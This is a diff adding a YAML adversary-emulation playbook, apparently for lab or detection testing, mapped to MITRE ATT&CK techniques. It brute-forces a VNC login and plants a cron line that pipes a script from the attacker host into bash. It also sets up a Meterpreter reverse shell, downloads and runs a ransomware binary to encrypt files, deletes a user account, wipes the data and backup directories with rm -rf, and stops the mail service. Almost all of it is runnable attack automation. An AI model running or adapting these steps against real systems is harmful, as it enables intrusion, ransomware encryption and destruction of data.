@@ -1,0 +1,237 @@
+####################
+#
+# Scenario 3 a b 
+#
+####################
+
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $DNS_SERVER: 192.42.0.233
+  $LISTA:
+  - "password1"
+  - "password2"
+  - "password3"
+  - "password4"
+  - "password5"
+  - "123"
+  - "12345"
+  - "12345678"
+ 
+commands:
+  - type: loop
+    break_if: $RESULT_STDOUT =~ vnc_connected
+    cmd: "items(LISTA)"
+    commands:
+    - type: vnc
+      creates_session: foothold
+      username: john
+      password: $LOOP_ITEM 
+      hostname: $SERVER_ADDRESS
+      port: "5901"
+      cmd: move
+      x: 5
+      y: 5
+    metadata:
+      techniques: "T1110.001,T1021.005"
+      tactics: "Credential Access, Lateral Movement"
+      technique_name: "Brute Force: Password Guessing,Remote Services: VNC"
+
+  - type: vnc
+    session: foothold
+    cmd: click
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "terminal"
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "sudo -i"
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: echo "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash" >> /media/share/healthcheck_cron.sh
+    metadata:
+      techniques: "T1105,T1059.004,T1053.003,T1021.005,T1071.001"
+      tactics: "Execution,Defense Evasion,Persistence,Command and Control"
+      technique_name: "Ingress Tool Transfer,Command and Scripting Interpreter: Unix Shell,Scheduled Task/Job: Cron,Remote Services: VNC,Application Layer Protocol: Web Protocols"
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 1
+
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+
+  - type: msf-payload
+    cmd: cmd/unix/python/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    local_path: $RSHELL
+
+  - type: msf-module
+    creates_session: movement
+    cmd: exploit/multi/handler
+    payload: "cmd/unix/python/meterpreter/reverse_tcp"
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    background: true
+    kill_on_exit: true
+
+  - type: webserv
+    local_path: $RSHELL
+    port: 8888
+    background: True
+    kill_on_exit: true
+
+  - type: vnc
+    cmd: close
+    session: foothold
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
+#################### MOVED ############################################
+  - type: msf-session
+    session: movement
+    cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
+      technique_name: "System Information Discovery"
+
+  - type: msf-session
+    session: movement
+    cmd: getuid
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
+
+  - type: msf-session
+    session: movement
+    cmd: shell
+
+  # Prepare for upgradeshell
+  - type: setvar
+    cmd: movement
+    variable: $UPGRADESESSION
+
+  - type: include
+    local_path: upgrade.yml
+
+  - type: msf-session
+    session: movement
+    cmd: curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry
+    metadata:
+      techniques: "T1486,T1105"
+      tactics: "Impact,Command and Control"
+      technique_name: "Data Encrypted for Impact,Ingress Tool Transfer"
+
+  - type: msf-session
+    session: movement
+    cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
+    metadata:
+      techniques: "T1486,T1565.001"
+      tactics: "Impact"
+      technique_name: "Data Encrypted for Impact,Data Manipulation: Stored Data Manipulation"
+
+  - type: msf-session
+    session: movement
+    cmd: find /media/data/Images
+    metadata:
+      techniques: "T1018"
+      tactics: "Discovery"
+      technique_name: "Remote System Discovery"
+
+  - type: msf-session
+    session: movement
+    cmd: cat /etc/passwd
+    metadata:
+      techniques: "T1087.001"
+      tactics: "Discovery"
+      technique_name: "Account Discovery: Local Account"
+  
+  - type: msf-session
+    session: movement
+    cmd: userdel -f john
+    metadata:
+      techniques: "T1531"
+      tactics: "Impact"
+      technique_name: "Account Access Removal"
+  
+  - type: msf-session
+    session: movement
+    cmd: rm -rf /media/data/*
+    metadata:
+      techniques: "T1485"
+      tactics: "Impact"
+      technique_name: "Data Destruction"
+  
+  - type: msf-session
+    session: movement
+    cmd: rm -rf /var/backups/*
+    metadata:
+      techniques: "T1490"
+      tactics: "Impact"
+      technique_name: "Inhibit System Recovery"
+
+  - type: msf-session
+    session: movement
+    cmd: systemctl stop exim4.service
+    metadata:
+      techniques: "T1489"
+      tactics: "Impact"
+      technique_name: "Service Stop"
